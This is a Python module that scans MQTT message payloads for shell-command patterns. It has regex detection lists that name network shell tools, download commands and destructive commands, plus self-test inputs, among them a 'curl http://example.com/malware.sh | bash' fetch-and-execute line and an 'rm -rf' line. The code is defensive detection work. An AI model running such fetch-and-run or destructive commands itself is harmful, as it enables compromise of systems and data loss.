#!/usr/bin/env python3
"""
MQTT Command Detection Module
Reusable module for detecting command patterns in MQTT payloads
"""

import re
import base64
import binascii
from typing import Dict, List, Tuple, Optional
from dataclasses import dataclass
from enum import Enum

class MessageType(Enum):
    NORMAL = "NORMAL"
    COMMAND = "COMMAND"
    RESPONSE = "RESPONSE"
    UNKNOWN = "UNKNOWN"

@dataclass
class CommandAnalysis:
    message_type: MessageType
    confidence: float
    detected_commands: List[str]
    suspicious_patterns: List[str]
    is_encoded: bool
    encoding_type: Optional[str]
    risk_level: str

class MQTTCommandDetector:
    def __init__(self):
        # Command patterns (case-insensitive)
        self.command_patterns = {
            # System commands
            'system': [
                r'\b(whoami|id|uname|hostname|uptime|date|time)\b',
                r'\b(ps|top|htop|kill|killall|pkill)\b',
                r'\b(df|du|free|vmstat|iostat)\b',
                r'\b(ls|dir|pwd|cd|mkdir|rmdir|rm|cp|mv|chmod|chown)\b',
                r'\b(cat|head|tail|grep|awk|sed|cut|sort|uniq)\b',
                r'\b(find|locate|which|whereis)\b',
                r'\b(netstat|ss|lsof|fuser)\b',
                r'\b(ifconfig|ip|route|arp|ping|traceroute|nslookup|dig)\b',
                r'\b(wget|curl|nc|netcat|telnet|ssh|scp|rsync)\b',
                r'\b(sudo|su|passwd|useradd|userdel|usermod)\b',
                r'\b(systemctl|service|init|rc)\b',
                r'\b(crontab|at|batch)\b',
                r'\b(history|alias|export|source)\b',
                r'\b(env|printenv|set|unset)\b',
                r'\b(which|type|command|hash)\b'
            ],
            
            # File operations
            'file_ops': [
                r'\b(touch|echo|printf|read|write)\b',
                r'\b(tar|gzip|gunzip|zip|unzip)\b',
                r'\b(dd|hexdump|od|xxd)\b',
                r'\b(file|stat|test|\[|\[\[)\b',
                r'\b(ln|ln -s|symlink)\b'
            ],
            
            # Network commands
            'network': [
                r'\b(nc|netcat|ncat)\b',
                r'\b(telnet|ssh|scp|rsync)\b',
                r'\b(wget|curl|wget|fetch)\b',
                r'\b(ftp|sftp|tftp)\b',
                r'\b(nmap|masscan|zmap)\b',
                r'\b(tcpdump|wireshark|tshark)\b',
                r'\b(iptables|ufw|firewall)\b'
            ],
            
            # Process and system control
            'process': [
                r'\b(ps|pstree|pgrep|pidof)\b',
                r'\b(kill|killall|pkill|kill -9)\b',
                r'\b(nohup|screen|tmux|disown)\b',
                r'\b(bg|fg|jobs)\b',
                r'\b(exec|eval|source)\b'
            ],
            
            # Shell and scripting
            'shell': [
                r'\b(bash|sh|zsh|fish|csh|tcsh)\b',
                r'\b(python|python3|perl|ruby|node|php)\b',
                r'\b(awk|sed|grep|cut|sort|uniq)\b',
                r'\b(if|for|while|case|function)\b',
                r'\b(&&|\|\||;|&|>|>>|2>|2>&1)\b'
            ],
            
            # Dangerous commands
            'dangerous': [
                r'\b(rm -rf|rm -f|rm -r)\b',
                r'\b(mkfs|fdisk|parted|dd if=)\b',
                r'\b(chmod 777|chmod 000)\b',
                r'\b(passwd|userdel|groupdel)\b',
                r'\b(systemctl stop|service stop)\b',
                r'\b(shutdown|reboot|halt|poweroff)\b',
                r'\b(init 0|init 6)\b'
            ]
        }
        
        # Response patterns
        self.response_patterns = [
            r'\b(OK|SUCCESS|COMPLETED|DONE)\b',
            r'\b(ERROR|FAILED|EXCEPTION|TIMEOUT)\b',
            r'\b(EXIT CODE|RETURN CODE|STATUS)\b',
            r'\b(STDOUT|STDERR|OUTPUT|RESULT)\b'
        ]
        
        # Suspicious patterns
        self.suspicious_patterns = [
            r'[;&|`$(){}]',  # Shell metacharacters
            r'\\x[0-9a-fA-F]{2}',  # Hex encoding
            r'%[0-9a-fA-F]{2}',  # URL encoding
            r'base64|b64',  # Base64 references
            r'powershell|cmd|cmd\.exe',  # Windows commands
            r'wget.*http|curl.*http',  # Download commands
            r'nc.*-l.*-p|netcat.*-l.*-p',  # Listen mode
            r'python.*-c|perl.*-e|ruby.*-e',  # Code execution
            r'eval\(|exec\(|system\(',  # Code execution functions
        ]
        
        # Compile regex patterns for efficiency
        self.compiled_patterns = {}
        for category, patterns in self.command_patterns.items():
            self.compiled_patterns[category] = [
                re.compile(pattern, re.IGNORECASE) for pattern in patterns
            ]
        
        self.compiled_response_patterns = [
            re.compile(pattern, re.IGNORECASE) for pattern in self.response_patterns
        ]
        
        self.compiled_suspicious_patterns = [
            re.compile(pattern, re.IGNORECASE) for pattern in self.suspicious_patterns
        ]

    def detect_encoding(self, payload: str) -> Tuple[bool, Optional[str]]:
        """Detect if payload is encoded and what type of encoding"""
        try:
            # Try base64 decoding
            decoded = base64.b64decode(payload)
            if decoded != payload.encode():
                return True, "base64"
        except:
            pass
        
        try:
            # Try hex decoding
            if len(payload) % 2 == 0 and all(c in '0123456789abcdefABCDEF' for c in payload):
                decoded = binascii.unhexlify(payload)
                return True, "hex"
        except:
            pass
        
        # Check for URL encoding
        if '%' in payload and re.search(r'%[0-9a-fA-F]{2}', payload):
            return True, "url"
        
        return False, None

    def analyze_payload(self, payload: str, topic: str = "") -> CommandAnalysis:
        """Analyze MQTT payload for command patterns"""
        if not payload or not payload.strip():
            return CommandAnalysis(
                message_type=MessageType.NORMAL,
                confidence=0.0,
                detected_commands=[],
                suspicious_patterns=[],
                is_encoded=False,
                encoding_type=None,
                risk_level="low"
            )
        
        # Clean payload
        clean_payload = payload.strip()
        
        # Detect encoding
        is_encoded, encoding_type = self.detect_encoding(clean_payload)
        
        # Decode if necessary
        analysis_payload = clean_payload
        if is_encoded and encoding_type == "base64":
            try:
                analysis_payload = base64.b64decode(clean_payload).decode('utf-8', errors='ignore')
            except:
                analysis_payload = clean_payload
        elif is_encoded and encoding_type == "hex":
            try:
                analysis_payload = binascii.unhexlify(clean_payload).decode('utf-8', errors='ignore')
            except:
                analysis_payload = clean_payload
        
        # Detect commands
        detected_commands = []
        command_confidence = 0.0
        
        for category, patterns in self.compiled_patterns.items():
            for pattern in patterns:
                matches = pattern.findall(analysis_payload)
                if matches:
                    detected_commands.extend(matches)
                    command_confidence += 0.2  # Increase confidence for each match
        
        # Detect response patterns
        response_matches = []
        for pattern in self.compiled_response_patterns:
            matches = pattern.findall(analysis_payload)
            response_matches.extend(matches)
        
        # Detect suspicious patterns
        suspicious_matches = []
        for pattern in self.compiled_suspicious_patterns:
            matches = pattern.findall(analysis_payload)
            suspicious_matches.extend(matches)
        
        # Determine message type
        message_type = MessageType.NORMAL
        if detected_commands:
            message_type = MessageType.COMMAND
        elif response_matches:
            message_type = MessageType.RESPONSE
        
        # Calculate confidence
        confidence = min(command_confidence, 1.0)
        if is_encoded:
            confidence += 0.1
        if suspicious_matches:
            confidence += 0.2
        
        # Determine risk level
        risk_level = "low"
        if detected_commands:
            # Check for dangerous commands
            dangerous_commands = [cmd for cmd in detected_commands 
                                if any(re.search(pattern, cmd, re.IGNORECASE) 
                                      for pattern in self.command_patterns['dangerous'])]
            if dangerous_commands:
                risk_level = "high"
            elif len(detected_commands) > 3:
                risk_level = "medium"
            else:
                risk_level = "low"
        
        return CommandAnalysis(
            message_type=message_type,
            confidence=confidence,
            detected_commands=list(set(detected_commands)),  # Remove duplicates
            suspicious_patterns=list(set(suspicious_matches)),
            is_encoded=is_encoded,
            encoding_type=encoding_type,
            risk_level=risk_level
        )

    def is_command(self, payload: str, topic: str = "") -> bool:
        """Quick check if payload contains commands"""
        analysis = self.analyze_payload(payload, topic)
        return analysis.message_type == MessageType.COMMAND

    def get_command_summary(self, analysis: CommandAnalysis) -> str:
        """Get a human-readable summary of the analysis"""
        if analysis.message_type == MessageType.COMMAND:
            commands_str = ", ".join(analysis.detected_commands[:3])
            if len(analysis.detected_commands) > 3:
                commands_str += f" (+{len(analysis.detected_commands) - 3} more)"
            
            summary = f"COMMAND detected: {commands_str}"
            if analysis.is_encoded:
                summary += f" (encoded: {analysis.encoding_type})"
            if analysis.suspicious_patterns:
                summary += f" [suspicious: {len(analysis.suspicious_patterns)} patterns]"
            
            return summary
        elif analysis.message_type == MessageType.RESPONSE:
            return "RESPONSE detected"
        else:
            return "Normal message"

# Global detector instance
_detector = None

def get_detector() -> MQTTCommandDetector:
    """Get global detector instance (singleton pattern)"""
    global _detector
    if _detector is None:
        _detector = MQTTCommandDetector()
    return _detector

# Convenience functions
def analyze_message(payload: str, topic: str = "") -> CommandAnalysis:
    """Analyze a message for command patterns"""
    return get_detector().analyze_payload(payload, topic)

def is_command_message(payload: str, topic: str = "") -> bool:
    """Quick check if message contains commands"""
    return get_detector().is_command(payload, topic)

# If script is run directly, test the detector
if __name__ == "__main__":
    detector = MQTTCommandDetector()
    
    test_messages = [
        "whoami",
        "ls -la /home",
        "rm -rf /tmp/test",
        "Hello world",
        "OK: Command completed successfully",
        "d2hvYW1p",  # base64 encoded "whoami"
        "python -c 'import os; os.system(\"whoami\")'",
        "curl http://example.com/malware.sh | bash",
        "normal data message",
        "ps aux | grep python"
    ]
    
    print("MQTT Command Detector Test")
    print("=" * 50)
    
    for msg in test_messages:
        analysis = detector.analyze_payload(msg)
        summary = detector.get_command_summary(analysis)
        print(f"Message: {msg}")
        print(f"Analysis: {summary}")
        print(f"Confidence: {analysis.confidence:.2f}")
        print(f"Risk Level: {analysis.risk_level}")
        print("-" * 30)